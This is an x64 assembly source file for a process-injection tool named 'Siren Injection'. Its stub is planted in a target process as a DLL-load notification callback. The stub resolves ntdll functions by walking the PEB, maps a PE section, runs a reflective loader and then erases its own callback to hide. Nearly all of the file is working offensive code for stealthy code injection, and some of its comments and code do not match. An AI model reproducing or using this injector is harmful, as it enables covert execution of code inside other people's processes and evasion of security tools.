; src/stub/siren_stub_x64.S
;
; Siren Injection — PIC notification stub (x64 MASM syntax)
;
; This stub IS the LDR_DLL_NOTIFICATION callback placed in the target
; process's section slack space.  It runs inside the target, called by
; the Windows loader with the loader lock held.
;
; Calling convention (Windows x64):
;   RCX = ULONG  NotificationReason
;   RDX = PVOID  NotificationData
;   R8  = PVOID  Context  ← HANDLE of the PE section (planted by injector)
;
; What we do:
;   1. Save non-volatile registers + align stack.
;   2. Call NtMapViewOfSection (ntdll) to map the PE section (RW first).
;   3. Call the embedded reflective loader with the mapped base.
;   4. NtUnmapViewOfSection the temporary RW view (loader created its own).
;   5. NtClose the section handle.
;   6. NOP-self: write NULL over entry->Callback so we never fire again.
;   7. Restore and ret.
;
; All NT functions are resolved via PEB walk at runtime (PIC).
; No imports, no IAT references.
;
; NOTE: This file uses MASM syntax for cross-compilation via ml64.exe.
;       For MinGW (GAS) builds, see siren_stub_x64_gas.S.
; ---------------------------------------------------------------------------

.code

; ---------------------------------------------------------------------------
; Exported symbols consumed by siren_stub.c
; ---------------------------------------------------------------------------

PUBLIC siren_stub_code
PUBLIC siren_stub_code_size
PUBLIC siren_stub_handle_patch_offset

; ---------------------------------------------------------------------------
; PEB-walk helper: find module base by walking InMemoryOrderModuleList.
; Input:  RCX = pointer to ASCII DLL name (NUL-terminated, lowercase)
; Output: RAX = module base or 0
; Clobbers: RCX, RDX, R8, R9, R10, R11
; ---------------------------------------------------------------------------
sr_find_module PROC
    ; TEB.ProcessEnvironmentBlock at GS:[0x60]
    mov  rax, gs:[60h]          ; RAX = PEB
    mov  rax, [rax + 18h]       ; RAX = PEB.Ldr (PEB_LDR_DATA*)
    ; InMemoryOrderModuleList is at offset 0x20 in PEB_LDR_DATA
    lea  r10, [rax + 20h]       ; R10 = list head
    mov  r11, [r10]             ; R11 = head->Flink (first entry)
sr_find_loop:
    cmp  r11, r10
    je   sr_find_not_found
    ; LDR_DATA_TABLE_ENTRY.DllBase is at offset 0x30 from InLoadOrder start
    ; InMemoryOrderLinks is at +0x10, so DllBase is at (r11 - 0x10) + 0x30 = r11 + 0x20
    mov  r9, [r11 + 20h]        ; R9 = DllBase
    test r9, r9
    jz   sr_find_next
    cmp  r9, 10000h
    jb   sr_find_next
    ; BaseDllName is UNICODE_STRING at +0x48 from entry start = (r11-0x10)+0x48 = r11+0x38
    mov  r8,  [r11 + 40h]       ; BaseDllName.Buffer (wide)
    movzx edx, word ptr [r11 + 38h] ; BaseDllName.Length (bytes)
    shr  edx, 1                 ; RDX = length in wchars
    ; Compare case-insensitively with RCX (ASCII)
    push rcx
    push r11
    xor  eax, eax
sr_cmp_loop:
    test edx, edx
    jz   sr_cmp_check_end
    movzx eax, byte ptr [rcx]   ; ASCII char
    test al, al
    jz   sr_cmp_mismatch
    ; tolower ASCII
    cmp  al, 'A'
    jb   sr_cmp_skip_lower
    cmp  al, 'Z'
    ja   sr_cmp_skip_lower
    or   al, 20h
sr_cmp_skip_lower:
    movzx r11d, word ptr [r8]   ; wide char
    ; tolower wide
    cmp  r11d, 'A'
    jb   sr_cmp_skip_lower2
    cmp  r11d, 'Z'
    ja   sr_cmp_skip_lower2
    or   r11d, 20h
sr_cmp_skip_lower2:
    cmp  eax, r11d
    jne  sr_cmp_mismatch
    inc  rcx
    add  r8, 2
    dec  edx
    jmp  sr_cmp_loop
sr_cmp_check_end:
    movzx eax, byte ptr [rcx]   ; must be NUL
    test al, al
    jnz  sr_cmp_mismatch
    ; Match!
    pop  r11
    pop  rcx
    mov  rax, r9                ; return DllBase
    ret
sr_cmp_mismatch:
    pop  r11
    pop  rcx
sr_find_next:
    mov  r11, [r11]             ; r11 = Flink
    jmp  sr_find_loop
sr_find_not_found:
    xor  eax, eax
    ret
sr_find_module ENDP

; ---------------------------------------------------------------------------
; Export resolver: find a named export in a loaded module.
; Input:  RCX = module base, RDX = ASCII function name
; Output: RAX = function address or 0
; Clobbers: RCX, RDX, R8–R11
; ---------------------------------------------------------------------------
sr_find_export PROC
    push rbx
    push rsi
    push rdi
    push r12
    push r13
    push r14
    push r15

    mov  r12, rcx               ; R12 = mod base
    mov  r13, rdx               ; R13 = func name

    ; Read export dir RVA from DataDirectory[0]
    mov  eax, dword ptr [r12 + 3Ch]  ; e_lfanew
    add  rax, r12
    ; OptionalHeader starts at NT+0x18, DataDirectory[0] at OptHdr+0x70
    ; NT+0x18 = FileHeader(0x14)+4sig = 0x18; OptHdr offset 0x70 for first dir
    mov  esi, dword ptr [rax + 18h + 70h]   ; ExportDir RVA
    test esi, esi
    jz   sr_exp_not_found
    mov  ebx, dword ptr [rax + 18h + 74h]   ; ExportDir Size

    lea  r14, [r12 + rsi]       ; R14 = ExportDir*

    ; ExportDir layout: +0x18=NumberOfNames, +0x1C=AddressOfFunctions,
    ;                   +0x20=AddressOfNames, +0x24=AddressOfNameOrdinals
    mov  r15d, dword ptr [r14 + 18h]  ; NumberOfNames
    test r15d, r15d
    jz   sr_exp_not_found

    mov  ecx, dword ptr [r14 + 20h]   ; AddressOfNames RVA
    lea  rdi, [r12 + rcx]             ; RDI = names array

    xor  r9d, r9d                     ; loop counter
sr_exp_loop:
    cmp  r9d, r15d
    jae  sr_exp_not_found

    mov  ecx, dword ptr [rdi + r9*4]  ; name RVA
    lea  rcx, [r12 + rcx]             ; RCX = name ptr

    ; strcmp(RCX, R13)
    push rdi
    push r9
    mov  rsi, r13
sr_strcmp_loop:
    mov  al,  byte ptr [rcx]
    mov  dl,  byte ptr [rsi]
    cmp  al, dl
    jne  sr_strcmp_mismatch
    test al, al
    jz   sr_strcmp_match
    inc  rcx
    inc  rsi
    jmp  sr_strcmp_loop
sr_strcmp_mismatch:
    pop  r9
    pop  rdi
    inc  r9d
    jmp  sr_exp_loop
sr_strcmp_match:
    pop  r9
    pop  rdi
    ; Get ordinal index for this name
    mov  ecx, dword ptr [r14 + 24h]   ; AddressOfNameOrdinals RVA
    lea  rcx, [r12 + rcx]             ; ordinals array
    movzx ecx, word ptr [rcx + r9*2]  ; ordinal
    ; Get function RVA
    mov  edx, dword ptr [r14 + 1Ch]   ; AddressOfFunctions RVA
    lea  rdx, [r12 + rdx]
    mov  eax, dword ptr [rdx + rcx*4] ; func RVA

    ; Check for forwarder (within export dir)
    cmp  eax, esi               ; < ExportDir RVA?
    jb   sr_exp_ok
    lea  rcx, [rsi + rbx]       ; ExportDir RVA + Size
    cmp  eax, ecx               ; >= end?
    jae  sr_exp_ok
    ; It's a forwarder — return 0 (not handled in PIC stub)
    xor  eax, eax
    jmp  sr_exp_done
sr_exp_ok:
    add  rax, r12               ; absolute address
    jmp  sr_exp_done
sr_exp_not_found:
    xor  eax, eax
sr_exp_done:
    pop  r15
    pop  r14
    pop  r13
    pop  r12
    pop  rdi
    pop  rsi
    pop  rbx
    ret
sr_find_export ENDP

; ---------------------------------------------------------------------------
; Main notification stub
; ---------------------------------------------------------------------------
ALIGN 16
siren_stub_code LABEL BYTE

SirenNotifyStub PROC
    ; Standard Windows x64 prologue
    push rbp
    mov  rbp, rsp
    sub  rsp, 0A0h              ; shadow space (32) + locals + alignment
    and  rsp, NOT 0Fh
    push rbx
    push rsi
    push rdi
    push r12
    push r13
    push r14
    push r15

    ; Save arguments
    mov  r12, rcx               ; NotificationReason
    mov  r13, rdx               ; NotificationData
    mov  r14, r8                ; Context = section HANDLE

    ; -------------------------------------------------------------------
    ; 1. Resolve NtMapViewOfSection in ntdll
    ; -------------------------------------------------------------------
    lea  rcx, [rip + str_ntdll]
    call sr_find_module
    test rax, rax
    jz   stub_done
    mov  r15, rax               ; R15 = ntdll base

    mov  rcx, r15
    lea  rdx, [rip + str_ntmvos]
    call sr_find_export
    test rax, rax
    jz   stub_done
    mov  rbx, rax               ; RBX = NtMapViewOfSection

    ; -------------------------------------------------------------------
    ; 2. Map the PE section into this process (RW view for loader)
    ;    NtMapViewOfSection(hSection, hProcess, &Base, 0, 0, NULL,
    ;                       &ViewSize, ViewUnmap=2, 0, PAGE_READONLY)
    ; -------------------------------------------------------------------
    sub  rsp, 50h               ; locals: &Base, &ViewSize on stack

    xor  eax, eax
    mov  qword ptr [rbp - 10h], rax   ; Base = NULL
    mov  qword ptr [rbp - 18h], rax   ; ViewSize = 0

    mov  rcx, r14               ; hSection
    mov  rdx, -1                ; hProcess = current
    lea  r8,  [rbp - 10h]       ; &Base
    xor  r9,  r9                ; ZeroBits = 0
    sub  rsp, 20h               ; additional shadow for >4 params
    xor  eax, eax
    mov  qword ptr [rsp +  0h], rax   ; CommitSize = 0
    mov  qword ptr [rsp +  8h], rax   ; SectionOffset = NULL
    lea  rax, [rbp - 18h]
    mov  qword ptr [rsp + 10h], rax   ; &ViewSize
    mov  qword ptr [rsp + 18h], 2     ; InheritDisposition = ViewUnmap
    mov  qword ptr [rsp + 20h], rax   ; AllocationType = 0 (reuse rax, fix below)
    xor  eax, eax
    mov  qword ptr [rsp + 20h], rax   ; AllocationType = 0
    mov  qword ptr [rsp + 28h], 2h    ; Win32Protect = PAGE_READONLY (2)

    call rbx                    ; NtMapViewOfSection
    add  rsp, 20h

    test eax, eax
    js   stub_done_unmap        ; NTSTATUS < 0 → failed

    mov  rsi, qword ptr [rbp - 10h]   ; RSI = mapped base
    test rsi, rsi
    jz   stub_done

    ; -------------------------------------------------------------------
    ; 3. Resolve sr_refl_load (embedded in this blob right after our code)
    ;    We call the C reflective loader via a known offset.
    ;    The offset is patched by siren_stub.c at build time.
    ;    For now, embed a call-relative stub.
    ; -------------------------------------------------------------------
    ; The reflective loader follows immediately in the same allocation.
    ; We use a call-forward to the embedded sr_refl_load copy.
    mov  rcx, rsi                              ; section_view = mapped base
    mov  qword ptr [rbp - 20h], rsi            ; save for later unmap

    ; view_size: we don't know it precisely; pass a conservative large value.
    ; The reflective loader only reads up to SizeOfImage which is in the PE.
    mov  rdx, 40000000h                        ; 1 GB — safe upper bound
    call sr_refl_load_embedded

    ; -------------------------------------------------------------------
    ; 4. Resolve NtUnmapViewOfSection + unmap our RW view
    ; -------------------------------------------------------------------
    mov  rcx, r15
    lea  rdx, [rip + str_ntumvos]
    call sr_find_export
    test rax, rax
    jz   stub_done_unmap

    mov  rcx, -1                ; hProcess = current
    mov  rdx, qword ptr [rbp - 20h]  ; Base
    call rax                    ; NtUnmapViewOfSection

stub_done_unmap:
    ; -------------------------------------------------------------------
    ; 5. NtClose the section handle
    ; -------------------------------------------------------------------
    mov  rcx, r15
    lea  rdx, [rip + str_ntclose]
    call sr_find_export
    test rax, rax
    jz   stub_done

    mov  rcx, r14               ; hSection
    call rax                    ; NtClose

stub_done:
    ; -------------------------------------------------------------------
    ; 6. NOP-self: zero out entry->Callback so we never fire again.
    ;    The entry is at siren_stub_entry_offset() bytes past blob start.
    ;    We compute the blob start via RIP-relative addressing.
    ;
    ;    entry->Callback is at offset 16 from entry start
    ;    (LIST_ENTRY = 16 bytes, then Callback at +16).
    ; -------------------------------------------------------------------
    ; NOTE: zeroing Callback in a doubly-linked list while the loader
    ; holds the lock is safe because the loader has already advanced its
    ; cursor past our entry before invoking the callback.
    ;
    ; We use RIP + known_offset to find the entry.  The entry offset is
    ; stored as a QWORD immediately following this stub code — patched
    ; by siren_stub.c.
    lea  rax, [rip + stub_entry_offset_slot]
    mov  rax, qword ptr [rax]   ; load the offset value
    lea  rcx, [rip + siren_stub_code]  ; blob start (same RIP base)
    add  rcx, rax               ; RCX = entry address in THIS process
    ; Callback is at entry + 16 (after LIST_ENTRY Flink+Blink)
    xor  eax, eax
    mov  qword ptr [rcx + 10h], rax  ; zero Callback

    ; -------------------------------------------------------------------
    ; Epilogue
    ; -------------------------------------------------------------------
    pop  r15
    pop  r14
    pop  r13
    pop  r12
    pop  rdi
    pop  rsi
    pop  rbx
    mov  rsp, rbp
    pop  rbp
    ret

SirenNotifyStub ENDP

; ---------------------------------------------------------------------------
; Embedded stub entry offset slot (patched by siren_stub.c)
; ---------------------------------------------------------------------------
ALIGN 8
stub_entry_offset_slot QWORD 0

; ---------------------------------------------------------------------------
; String literals (ASCII, NUL-terminated) — referenced RIP-relative
; ---------------------------------------------------------------------------
str_ntdll    BYTE "ntdll.dll", 0
str_ntmvos   BYTE "NtMapViewOfSection", 0
str_ntumvos  BYTE "NtUnmapViewOfSection", 0
str_ntclose  BYTE "NtClose", 0

; ---------------------------------------------------------------------------
; Handle patch slot — siren_stub.c writes the HANDLE value here.
; Offset of this label from siren_stub_code is siren_stub_handle_patch_offset.
; ---------------------------------------------------------------------------
ALIGN 8
siren_stub_handle_slot QWORD 0DEADBEEFCAFEBABEh

; ---------------------------------------------------------------------------
; Embedded reflective loader (position-independent).
; sr_refl_load is compiled separately and linked here.
; This EXTERN declaration makes the linker pull it in.
; ---------------------------------------------------------------------------
EXTERN sr_refl_load_embedded : PROC   ; defined in refl_loader.c (alias)

; ---------------------------------------------------------------------------
; Exported size and patch offset symbols (consumed by siren_stub.c)
; ---------------------------------------------------------------------------
ALIGN 8
siren_stub_code_end LABEL BYTE

siren_stub_code_size           QWORD siren_stub_code_end - siren_stub_code
siren_stub_handle_patch_offset QWORD siren_stub_handle_slot - siren_stub_code

END
